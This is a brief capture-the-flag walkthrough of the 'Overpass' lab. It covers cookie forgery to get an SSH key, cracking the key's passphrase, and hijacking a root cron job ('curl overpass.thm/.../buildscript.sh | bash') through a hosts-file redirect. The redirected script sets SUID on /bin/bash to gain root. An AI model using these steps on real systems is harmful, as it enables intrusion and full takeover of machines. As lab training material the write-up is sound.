Setting cookie gives a private SSH key!

John the ripper gives the password as james13 (Doesn't work????? --> Add a new line at the end of the private key)

Run linpeas.sh

Found root curl overpass.thm/downloads/src/buildscript.sh | bash
This command is executed regularly (**** in linpeas.sh). And we can modify the hosts file. 

Change the overpass.thm url to our machine's url.

Make a www folder and simulate the entire folder structure to match the command.

Add whatever command we want in our own buildscript.sh

use chmod +s /bin/bash, giving SUID permission to bash usage. Making it executed by root everytime it is used.

Fire up python http server on port 80 from the www directory.

Use /bin/bash -p and boom you're root.
